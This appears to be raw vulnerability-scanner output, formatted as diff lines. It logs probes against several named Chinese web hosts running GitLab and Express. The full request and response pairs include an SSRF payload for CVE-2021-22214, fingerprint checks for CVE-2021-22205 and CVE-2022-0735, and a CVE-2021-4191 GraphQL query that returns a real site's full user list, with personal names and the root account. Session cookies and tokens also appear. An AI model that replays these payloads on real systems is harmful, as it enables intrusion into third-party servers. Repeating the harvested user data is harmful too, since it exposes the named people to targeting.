+HTTP/1.1 200 OK
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: text/html; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:31 GMT
+Etag: W/"3eca40ba6ea93f27e1191794c8ca672d"
+Referrer-Policy: strict-origin-when-cross-origin
+Server: nginx
+Set-Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqYzBPV1ZqTURrMExUVXhaRFF0TkRRNE5DMDVNVFF4TFRObU5ESXdPR1l3TnpsaFpDST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--4824e84eb7438c6edb9dc2fd2876989a0f20d511; path=/; expires=Mon, 26 Mar 2046 06:17:31 -0000; secure; HttpOnly; SameSite=None
+Set-Cookie: _gitlab_session=cd92ceff15746eb11a32d2cf0299b2c2; path=/; expires=Thu, 26 Mar 2026 08:17:31 -0000; secure; HttpOnly; SameSite=None
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-Request-Id: nJ1Tk3TwCN9
+X-Runtime: 0.019273
+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+
+<!DOCTYPE html>
+<html class="devise-layout-html">
+<head prefix="og: http://ogp.me/ns#">
+<meta charset="utf-8">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<meta content="object" property="og:type">
+<meta content="GitLab" property="og:site_name">
+<meta content="Sign in" property="og:title">
+<meta content="GitLab Community Edition" property="og:description">
+<meta content="https://sandtest.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="og:image">
+<meta content="64" property="og:image:width">
+<meta content="64" property="og:image:height">
+<meta content="https://sandtest.yunqiandou.com/users/sign_in" property="og:url">
+<meta content="summary" property="twitter:card">
+<meta content="Sign in" property="twitter:title">
+<meta content="GitLab Community Edition" property="twitter:description">
+<meta content="https://sandtest.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="twitter:image">
+
+<title>Sign in · GitLab</title>
+<meta content="GitLab Community Edition" name="description">
+<link rel="shortcut icon" type="image/png" href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" id="favicon" data-original-href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" />
+<link rel="stylesheet" media="all" href="/assets/application-4abc4e078df94075056919bd59aed6e7a0f95067039a8339b8f614924d8cb160.css" />
+<link rel="stylesheet" media="print" href="/assets/print-74c3df10dad473d66660c828e3aa54ca3bfeac6d8bb708643331403fe7211e60.css" />
+
+
+<link rel="stylesheet" media="all" href="/assets/highlight/themes/white-aa541d93e094b4420ea8e2dcd8e2ee99bb24ef1010bbbd20d427b1f9c54d42da.css" />
+<script>
+//<![CDATA[
+window.gon={};
+//]]>
+</script>
+
+
+<script src="/assets/webpack/runtime.dd9905d6.bundle.js" defer="defer"></script>
+<script src="/assets/webpack/main.4ff6e187.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/commons~pages.admin.sessions~pages.ldap.omniauth_callbacks~pages.omniauth_callbacks~pages.profiles.t~f07ce35f.a6d33088.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/pages.sessions.new.6586209e.chunk.js" defer="defer"></script>
+
+<meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="DlP7UsLbqPHSlpajaTi9uAesHU+vPURIwnrZK2ZhfdPxGURaPCIg+HXQJ99W9FsNY2sBx8RKqTcnQRnJDWA+Vg==" />
+
+<meta name="action-cable-url" content="/-/cable" />
+<meta content="origin-when-cross-origin" name="referrer">
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="#474D57" name="theme-color">
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-5a9cee0e8a51212e70b90c87c12f382c428870c0ff67d1eb034d884b78d2dae7.png" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-a6eec6aeb9da138e507593b464fdac213047e49d3093fc30e90d9a995df83ba3.png" sizes="76x76" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-retina-72e2aadf86513a56e050e7f0f2355deaa19cc17ed97bbe5147847f2748e5a3e3.png" sizes="120x120" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-retina-8ebe416f5313483d9c1bc772b5bbe03ecad52a54eba443e5215a22caed2a16a2.png" sizes="152x152" />
+<link color="rgb(226, 67, 41)" href="/assets/logo-d36b5212042cebc89b96df4bf6ac24e43db316143e89926c0db839ff694d2de4.svg" rel="mask-icon">
+<meta content="/assets/msapplication-tile-1196ec67452f618d39cdd85e2e3a542f76574c071051ae7effbfde01710eb17d.png" name="msapplication-TileImage">
+<meta content="#30353E" name="msapplication-TileColor">
+
+
+
+
+</head>
+
+<body class="application gl-browser-firefox gl-platform-windows login-page navless ui-indigo" data-page="sessions:new" data-qa-selector="login_page">
+
+<script>
+//<![CDATA[
+gl = window.gl || {};
+gl.client = {"isFirefox":true,"isWindows":true};
+
+
+//]]>
+</script>
+<div class="page-wrap">
+<header class="navbar fixed-top navbar-empty">
+<svg width="24" height="24" class="tanuki-logo" viewBox="0 0 36 36">
+  <path class="tanuki-shape tanuki-left-ear" fill="#e24329" d="M2 14l9.38 9v-9l-4-12.28c-.205-.632-1.176-.632-1.38 0z"/>
+  <path class="tanuki-shape tanuki-right-ear" fill="#e24329" d="M34 14l-9.38 9v-9l4-12.28c.205-.632 1.176-.632 1.38 0z"/>
+  <path class="tanuki-shape tanuki-nose" fill="#e24329" d="M18,34.38 3,14 33,14 Z"/>
+  <path class="tanuki-shape tanuki-left-eye" fill="#fc6d26" d="M18,34.38 11.38,14 2,14 6,25Z"/>
+  <path class="tanuki-shape tanuki-right-eye" fill="#fc6d26" d="M18,34.38 24.62,14 34,14 30,25Z"/>
+  <path class="tanuki-shape tanuki-left-cheek" fill="#fca326" d="M2 14L.1 20.16c-.18.565 0 1.2.5 1.56l17.42 12.66z"/>
+  <path class="tanuki-shape tanuki-right-cheek" fill="#fca326" d="M34 14l1.9 6.16c.18.565 0 1.2-.5 1.56L18 34.38z"/>
+</svg>
+
+</header>
+
+<div class="login-page-broadcast">
+
+
+</div>
+<div class="container navless-container">
+<div class="content">
+<div class="flash-container flash-container-page sticky">
+</div>
+
+<div class="row mt-3">
+<div class="col-sm-12">
+<h1 class="mb-3 font-weight-normal">
+GitLab Community Edition
+</h1>
+</div>
+</div>
+<div class="row mb-3">
+<div class="col-sm-7 order-12 order-sm-1 brand-holder">
+
+<h3 class="mt-sm-0">
+A complete DevOps platform
+</h3>
+<p>
+GitLab is a single application for the entire software development lifecycle. From project planning and source code management to CI/CD, monitoring, and security.
+</p>
+
+</div>
+<div class="col-sm-5 order-1 order-sm-12 new-session-forms-container">
+<div id="signin-container">
+<ul class="nav-links new-session-tabs nav-tabs nav" role="tablist">
+<li class="nav-item" role="presentation">
+<a class="nav-link active" data-qa-selector="sign_in_tab" data-toggle="tab" href="#login-pane" role="tab">Sign in</a>
+</li>
+</ul>
+
+<div class="tab-content">
+<div class="login-box tab-pane active" id="login-pane" role="tabpanel">
+<div class="login-body">
+<form class="new_user gl-show-field-errors" id="new_user" aria-live="assertive" action="/users/sign_in" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="cKcM4XadXl+wJlvS7wWG5gQXKMW4TLhdZFOSzmfcgHSP7bPpiGTWVhdg6q7QyWBTYNA0TdM7VSKBaFIsDN3D8Q==" /><div class="form-group">
+<label for="user_login" class="label-bold">Username or email</label>
+<input class="form-control top" autofocus="autofocus" autocapitalize="off" autocorrect="off" required="required" title="This field is required." data-qa-selector="login_field" type="text" name="user[login]" id="user_login" />
+</div>
+<div class="form-group">
+<label class="label-bold" for="user_password">Password</label>
+<input class="form-control bottom" required="required" title="This field is required." data-qa-selector="password_field" type="password" name="user[password]" id="user_password" />
+</div>
+<div class="remember-me">
+<label for="user_remember_me">
+<input name="user[remember_me]" type="hidden" value="0" /><input class="remember-me-checkbox" type="checkbox" value="1" name="user[remember_me]" id="user_remember_me" />
+<span>Remember me</span>
+</label>
+<div class="float-right">
+<a href="/users/password/new">Forgot your password?</a>
+</div>
+</div>
+<div></div>
+<div class="submit-container move-submit-down">
+<input type="submit" name="commit" value="Sign in" class="btn btn-success" data-qa-selector="sign_in_button" data-disable-with="Sign in" />
+</div>
+</form>
+</div>
+</div>
+
+</div>
+</div>
+
+</div>
+</div>
+</div>
+</div>
+<hr class="footer-fixed">
+<div class="container footer-container">
+<div class="footer-links">
+<a href="/explore">Explore</a>
+<a href="/help">Help</a>
+<a href="https://about.gitlab.com/">About GitLab</a>
+</div>
+</div>
+
+</div>
+</body>
+</html>
+
+============================================
+https://www.hzcnde.com/m/                🤓 
+[vuln] [medium] [node-express-dev-env] https://admin.keyland.com.cn
+================  请求数据包 ================
+GET / HTTP/1.1
+Host: admin.keyland.com.cn
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15
+Content-Length: 1
+Connection: close
+Content-Type: application/json
+Accept-Encoding: gzip
+
+t
+================  请求响应包 ================
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 876
+Content-Security-Policy: default-src 'self'
+Content-Type: text/html; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:32 GMT
+Server: nginx/1.10.3 (Ubuntu)
+X-Content-Type-Options: nosniff
+X-Powered-By: Express
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>SyntaxError: Unexpected token t<br> &nbsp; &nbsp;at parse (/app/node_modules/body-parser/lib/types/json.js:83:15)<br> &nbsp; &nbsp;at /app/node_modules/body-parser/lib/read.js:116:18<br> &nbsp; &nbsp;at invokeCallback (/app/node_modules/raw-body/index.js:262:16)<br> &nbsp; &nbsp;at done (/app/node_modules/raw-body/index.js:251:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/app/node_modules/raw-body/index.js:307:7)<br> &nbsp; &nbsp;at emitNone (events.js:106:13)<br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:208:7)<br> &nbsp; &nbsp;at endReadableNT (_stream_readable.js:1064:12)<br> &nbsp; &nbsp;at _combinedTickCallback (internal/process/next_tick.js:138:11)<br> &nbsp; &nbsp;at process._tickCallback (internal/process/next_tick.js:180:9)</pre>
+</body>
+</html>
+
+============================================
+https://hzcnde.com/m/                    🤓 
+http://www.hzcnde.com/m/                 🤓 
+[vuln] [medium] [node-express-dev-env] http://mp.keyland.com.cn
+================  请求数据包 ================
+GET / HTTP/1.1
+Host: mp.keyland.com.cn
+User-Agent: Mozilla/5.0 (X11; Linux i686; en-US) Gecko/20010604 Firefox/109.0
+Content-Length: 1
+Connection: close
+Content-Type: application/json
+Accept-Encoding: gzip
+
+t
+================  请求响应包 ================
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 876
+Content-Security-Policy: default-src 'self'
+Content-Type: text/html; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:32 GMT
+Server: nginx/1.10.3 (Ubuntu)
+X-Content-Type-Options: nosniff
+X-Powered-By: Express
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>SyntaxError: Unexpected token t<br> &nbsp; &nbsp;at parse (/app/node_modules/body-parser/lib/types/json.js:83:15)<br> &nbsp; &nbsp;at /app/node_modules/body-parser/lib/read.js:116:18<br> &nbsp; &nbsp;at invokeCallback (/app/node_modules/raw-body/index.js:262:16)<br> &nbsp; &nbsp;at done (/app/node_modules/raw-body/index.js:251:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/app/node_modules/raw-body/index.js:307:7)<br> &nbsp; &nbsp;at emitNone (events.js:106:13)<br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:208:7)<br> &nbsp; &nbsp;at endReadableNT (_stream_readable.js:1064:12)<br> &nbsp; &nbsp;at _combinedTickCallback (internal/process/next_tick.js:138:11)<br> &nbsp; &nbsp;at process._tickCallback (internal/process/next_tick.js:180:9)</pre>
+</body>
+</html>
+
+============================================
+[vuln] [high] [CVE-2021-22214] https://weixin.yunqiandou.com/api/v4/ci/lint?include_merged_yaml=true
+================  请求数据包 ================
+POST /api/v4/ci/lint?include_merged_yaml=true HTTP/1.1
+Host: weixin.yunqiandou.com
+User-Agent: Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+Content-Length: 65
+Content-Type: application/json
+Accept-Encoding: gzip
+
+{"content": "include:\n  remote: http://127.0.0.1:9100/test.yml"}
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Content-Length: 113
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: application/json
+Date: Thu, 26 Mar 2026 06:17:32 GMT
+Etag: W/"b635f94e9dd628f1735099bfbf852052"
+Server: nginx
+Vary: Origin
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Request-Id: VnhU2MmsWt3
+X-Runtime: 0.008074
+
+{"status":"invalid","errors":["Included file `http://127.0.0.1:9100/test.yml` does not have valid YAML syntax!"]}
+============================================
+[vuln] [critical] [CVE-2021-22205] https://weixin.yunqiandou.com/users/sign_in
+================  请求数据包 ================
+GET /users/sign_in HTTP/1.1
+Host: weixin.yunqiandou.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: text/html; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:33 GMT
+Etag: W/"09300829ded589e96660e946cc3d103f"
+Referrer-Policy: strict-origin-when-cross-origin
+Server: nginx
+Set-Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqTTNNVE5qWkRCbUxUY3pNalF0TkdNM1pTMDVPV0ZpTFdRd1pqWTRaamt4TWpSalpDST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--5caaaec4c6dcb47d054e1aed0ac0ba7be4a8eb2e; path=/; expires=Mon, 26 Mar 2046 06:17:33 -0000; secure; HttpOnly; SameSite=None
+Set-Cookie: _gitlab_session=e3876d6cd1203bf7c1af73600fa25809; path=/; expires=Thu, 26 Mar 2026 08:17:33 -0000; secure; HttpOnly; SameSite=None
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-Request-Id: dQPB4VzJtA9
+X-Runtime: 0.052854
+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+
+<!DOCTYPE html>
+<html class="devise-layout-html">
+<head prefix="og: http://ogp.me/ns#">
+<meta charset="utf-8">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<meta content="object" property="og:type">
+<meta content="GitLab" property="og:site_name">
+<meta content="Sign in" property="og:title">
+<meta content="GitLab Community Edition" property="og:description">
+<meta content="https://weixin.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="og:image">
+<meta content="64" property="og:image:width">
+<meta content="64" property="og:image:height">
+<meta content="https://weixin.yunqiandou.com/users/sign_in" property="og:url">
+<meta content="summary" property="twitter:card">
+<meta content="Sign in" property="twitter:title">
+<meta content="GitLab Community Edition" property="twitter:description">
+<meta content="https://weixin.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="twitter:image">
+
+<title>Sign in · GitLab</title>
+<meta content="GitLab Community Edition" name="description">
+<link rel="shortcut icon" type="image/png" href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" id="favicon" data-original-href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" />
+<link rel="stylesheet" media="all" href="/assets/application-4abc4e078df94075056919bd59aed6e7a0f95067039a8339b8f614924d8cb160.css" />
+<link rel="stylesheet" media="print" href="/assets/print-74c3df10dad473d66660c828e3aa54ca3bfeac6d8bb708643331403fe7211e60.css" />
+
+
+<link rel="stylesheet" media="all" href="/assets/highlight/themes/white-aa541d93e094b4420ea8e2dcd8e2ee99bb24ef1010bbbd20d427b1f9c54d42da.css" />
+<script>
+//<![CDATA[
+window.gon={};
+//]]>
+</script>
+
+
+<script src="/assets/webpack/runtime.dd9905d6.bundle.js" defer="defer"></script>
+<script src="/assets/webpack/main.4ff6e187.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/commons~pages.admin.sessions~pages.ldap.omniauth_callbacks~pages.omniauth_callbacks~pages.profiles.t~f07ce35f.a6d33088.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/pages.sessions.new.6586209e.chunk.js" defer="defer"></script>
+
+<meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="y1WoYiLFovnnOKgt7Bbyu3+thx08UAgLzH0Lx8NSam7SypexQkTcex2FvPmEHEdOEN1/zqTCHZum9yloLWB/0g==" />
+
+<meta name="action-cable-url" content="/-/cable" />
+<meta content="origin-when-cross-origin" name="referrer">
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="#474D57" name="theme-color">
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-5a9cee0e8a51212e70b90c87c12f382c428870c0ff67d1eb034d884b78d2dae7.png" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-a6eec6aeb9da138e507593b464fdac213047e49d3093fc30e90d9a995df83ba3.png" sizes="76x76" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-retina-72e2aadf86513a56e050e7f0f2355deaa19cc17ed97bbe5147847f2748e5a3e3.png" sizes="120x120" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-retina-8ebe416f5313483d9c1bc772b5bbe03ecad52a54eba443e5215a22caed2a16a2.png" sizes="152x152" />
+<link color="rgb(226, 67, 41)" href="/assets/logo-d36b5212042cebc89b96df4bf6ac24e43db316143e89926c0db839ff694d2de4.svg" rel="mask-icon">
+<meta content="/assets/msapplication-tile-1196ec67452f618d39cdd85e2e3a542f76574c071051ae7effbfde01710eb17d.png" name="msapplication-TileImage">
+<meta content="#30353E" name="msapplication-TileColor">
+
+
+
+
+</head>
+
+<body class="application gl-browser-firefox gl-platform-windows login-page navless ui-indigo" data-page="sessions:new" data-qa-selector="login_page">
+
+<script>
+//<![CDATA[
+gl = window.gl || {};
+gl.client = {"isFirefox":true,"isWindows":true};
+
+
+//]]>
+</script>
+<div class="page-wrap">
+<header class="navbar fixed-top navbar-empty">
+<svg width="24" height="24" class="tanuki-logo" viewBox="0 0 36 36">
+  <path class="tanuki-shape tanuki-left-ear" fill="#e24329" d="M2 14l9.38 9v-9l-4-12.28c-.205-.632-1.176-.632-1.38 0z"/>
+  <path class="tanuki-shape tanuki-right-ear" fill="#e24329" d="M34 14l-9.38 9v-9l4-12.28c.205-.632 1.176-.632 1.38 0z"/>
+  <path class="tanuki-shape tanuki-nose" fill="#e24329" d="M18,34.38 3,14 33,14 Z"/>
+  <path class="tanuki-shape tanuki-left-eye" fill="#fc6d26" d="M18,34.38 11.38,14 2,14 6,25Z"/>
+  <path class="tanuki-shape tanuki-right-eye" fill="#fc6d26" d="M18,34.38 24.62,14 34,14 30,25Z"/>
+  <path class="tanuki-shape tanuki-left-cheek" fill="#fca326" d="M2 14L.1 20.16c-.18.565 0 1.2.5 1.56l17.42 12.66z"/>
+  <path class="tanuki-shape tanuki-right-cheek" fill="#fca326" d="M34 14l1.9 6.16c.18.565 0 1.2-.5 1.56L18 34.38z"/>
+</svg>
+
+</header>
+
+<div class="login-page-broadcast">
+
+
+</div>
+<div class="container navless-container">
+<div class="content">
+<div class="flash-container flash-container-page sticky">
+</div>
+
+<div class="row mt-3">
+<div class="col-sm-12">
+<h1 class="mb-3 font-weight-normal">
+GitLab Community Edition
+</h1>
+</div>
+</div>
+<div class="row mb-3">
+<div class="col-sm-7 order-12 order-sm-1 brand-holder">
+
+<h3 class="mt-sm-0">
+A complete DevOps platform
+</h3>
+<p>
+GitLab is a single application for the entire software development lifecycle. From project planning and source code management to CI/CD, monitoring, and security.
+</p>
+
+</div>
+<div class="col-sm-5 order-1 order-sm-12 new-session-forms-container">
+<div id="signin-container">
+<ul class="nav-links new-session-tabs nav-tabs nav" role="tablist">
+<li class="nav-item" role="presentation">
+<a class="nav-link active" data-qa-selector="sign_in_tab" data-toggle="tab" href="#login-pane" role="tab">Sign in</a>
+</li>
+</ul>
+
+<div class="tab-content">
+<div class="login-box tab-pane active" id="login-pane" role="tabpanel">
+<div class="login-body">
+<form class="new_user gl-show-field-errors" id="new_user" aria-live="assertive" action="/users/sign_in" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="eyXDv9LW1u2foc2dB2HSyd7FVcRNCIjWL+ObvE11H4hiuvxssleob2Uc2Ulva2c8sbWtF9WanUZFabkTo0cKNA==" /><div class="form-group">
+<label for="user_login" class="label-bold">Username or email</label>
+<input class="form-control top" autofocus="autofocus" autocapitalize="off" autocorrect="off" required="required" title="This field is required." data-qa-selector="login_field" type="text" name="user[login]" id="user_login" />
+</div>
+<div class="form-group">
+<label class="label-bold" for="user_password">Password</label>
+<input class="form-control bottom" required="required" title="This field is required." data-qa-selector="password_field" type="password" name="user[password]" id="user_password" />
+</div>
+<div class="remember-me">
+<label for="user_remember_me">
+<input name="user[remember_me]" type="hidden" value="0" /><input class="remember-me-checkbox" type="checkbox" value="1" name="user[remember_me]" id="user_remember_me" />
+<span>Remember me</span>
+</label>
+<div class="float-right">
+<a href="/users/password/new">Forgot your password?</a>
+</div>
+</div>
+<div></div>
+<div class="submit-container move-submit-down">
+<input type="submit" name="commit" value="Sign in" class="btn btn-success" data-qa-selector="sign_in_button" data-disable-with="Sign in" />
+</div>
+</form>
+</div>
+</div>
+
+</div>
+</div>
+
+</div>
+</div>
+</div>
+</div>
+<hr class="footer-fixed">
+<div class="container footer-container">
+<div class="footer-links">
+<a href="/explore">Explore</a>
+<a href="/help">Help</a>
+<a href="https://about.gitlab.com/">About GitLab</a>
+</div>
+</div>
+
+</div>
+</body>
+</html>
+
+============================================
+[vuln] [medium] [CVE-2021-4191] https://weixin.yunqiandou.com/api/graphql
+================  请求数据包 ================
+POST /api/graphql HTTP/1.1
+Host: weixin.yunqiandou.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 917
+Accept: */*
+Content-Type: application/json
+Origin: https://weixin.yunqiandou.com
+Referer: https://weixin.yunqiandou.com/-/graphql-explorer
+Accept-Encoding: gzip
+
+{"query":"# Welcome to GraphiQL\n#\n# GraphiQL is an in-browser tool for writing, validating, and\n# testing GraphQL queries.\n#\n# Type queries into this side of the screen, and you will see intelligent\n# typeaheads aware of the current GraphQL type schema and live syntax and\n# validation errors highlighted within the text.\n#\n# GraphQL queries typically start with a \"{\" character. Lines that starts\n# with a # are ignored.\n#\n# An example GraphQL query might look like:\n#\n#     {\n#       field(arg: \"value\") {\n#         subField\n#       }\n#     }\n#\n# Keyboard shortcuts:\n#\n#  Prettify Query:  Shift-Ctrl-P (or press the prettify button above)\n#\n#       Run Query:  Ctrl-Enter (or press the play button above)\n#\n#   Auto Complete:  Ctrl-Space (or just start typing)\n#\n\n{\n  users {\n    nodes {\n      id\n      name\n      username\n    }\n  }\n}","variables":null,"operationName":null}
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Transfer-Encoding: chunked
+Access-Control-Allow-Methods: GET, HEAD, POST, PUT, PATCH, DELETE, OPTIONS
+Access-Control-Allow-Origin: *
+Access-Control-Expose-Headers: Link, X-Total, X-Total-Pages, X-Per-Page, X-Page, X-Next-Page, X-Prev-Page, X-Gitlab-Blob-Id, X-Gitlab-Commit-Id, X-Gitlab-Content-Sha256, X-Gitlab-Encoding, X-Gitlab-File-Name, X-Gitlab-File-Path, X-Gitlab-Last-Commit-Id, X-Gitlab-Ref, X-Gitlab-Size
+Access-Control-Max-Age: 7200
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: application/json; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:33 GMT
+Etag: W/"ad332e571214fbf41c3f91b90d7adc9c"
+Referrer-Policy: strict-origin-when-cross-origin
+Server: nginx
+Vary: Origin
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-Request-Id: DGpRZxhwtT4
+X-Runtime: 0.047118
+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+
+{"data":{"users":{"nodes":[{"id":"gid://gitlab/User/65","name":"GitLab Alert Bot","username":"alert-bot"},{"id":"gid://gitlab/User/64","name":"zhanglijuan","username":"zhanglijuan"},{"id":"gid://gitlab/User/62","name":"yangwanli","username":"yangwanli"},{"id":"gid://gitlab/User/61","name":"wuwenyu","username":"wuwenyu"},{"id":"gid://gitlab/User/60","name":"tongmiao","username":"tongmiao"},{"id":"gid://gitlab/User/59","name":"lwj","username":"lwj"},{"id":"gid://gitlab/User/58","name":"gzt","username":"gzt"},{"id":"gid://gitlab/User/57","name":"wanglinyang","username":"wanglinyang"},{"id":"gid://gitlab/User/56","name":"hanshuai","username":"hanshuai"},{"id":"gid://gitlab/User/55","name":"heyi","username":"heyi"},{"id":"gid://gitlab/User/54","name":"meijie","username":"meijie"},{"id":"gid://gitlab/User/53","name":"lixin","username":"lixin"},{"id":"gid://gitlab/User/52","name":"zbf","username":"zbf"},{"id":"gid://gitlab/User/51","name":"liangdongdong","username":"liangdongdong"},{"id":"gid://gitlab/User/50","name":"chenwenxing","username":"chenwenxing"},{"id":"gid://gitlab/User/45","name":"wufan","username":"spirit-wufan"},{"id":"gid://gitlab/User/41","name":"jzk","username":"jzk"},{"id":"gid://gitlab/User/40","name":"zhoutianhui","username":"zhoutianhui"},{"id":"gid://gitlab/User/36","name":"黄政阳","username":"hzy"},{"id":"gid://gitlab/User/34","name":"zhouquanbo","username":"zhouquanbo"},{"id":"gid://gitlab/User/33","name":"ls","username":"ls"},{"id":"gid://gitlab/User/31","name":"9GphYZYkxe","username":"9GphYZYkxe"},{"id":"gid://gitlab/User/30","name":"zhangwei","username":"zhangwei"},{"id":"gid://gitlab/User/29","name":"chenkang@aicaihr.com","username":"chenkang"},{"id":"gid://gitlab/User/27","name":"lijiaxin","username":"lijiaxin"},{"id":"gid://gitlab/User/26","name":"heajing","username":"heajing"},{"id":"gid://gitlab/User/25","name":"yuxinyu","username":"yuxinyu"},{"id":"gid://gitlab/User/24","name":"fxl","username":"fxl"},{"id":"gid://gitlab/User/19","name":"songfeihu","username":"songfeihu"},{"id":"gid://gitlab/User/16","name":"chenyifan","username":"chenyifan"},{"id":"gid://gitlab/User/14","name":"xiaqi","username":"xiaqi"},{"id":"gid://gitlab/User/13","name":"tianmaoshan","username":"tianmaoshan"},{"id":"gid://gitlab/User/9","name":"chenpengfei","username":"chenpengfei"},{"id":"gid://gitlab/User/5","name":"Ghost User","username":"ghost"},{"id":"gid://gitlab/User/3","name":"liuyuhong","username":"lyh"},{"id":"gid://gitlab/User/2","name":"maxuefeng","username":"maxuefeng"},{"id":"gid://gitlab/User/1","name":"Administrator","username":"root"}]}}}
+============================================
+[vuln] [critical] [CVE-2022-0735] https://weixin.yunqiandou.com/users/sign_in
+================  请求数据包 ================
+GET /users/sign_in HTTP/1.1
+Host: weixin.yunqiandou.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: text/html; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:33 GMT
+Etag: W/"4adc14388e1c17f04a4c7fc4c10ca7ce"
+Referrer-Policy: strict-origin-when-cross-origin
+Server: nginx
+Set-Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqQTBZVEl3TW1SaExUaGtaREV0TkdJMlpTMDRPVE00TFRJeE1HVTRPRE5rTVRSa09DST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--3dbe33b65b5c7307c7c44b3f92ba13abd3be9e02; path=/; expires=Mon, 26 Mar 2046 06:17:33 -0000; secure; HttpOnly; SameSite=None
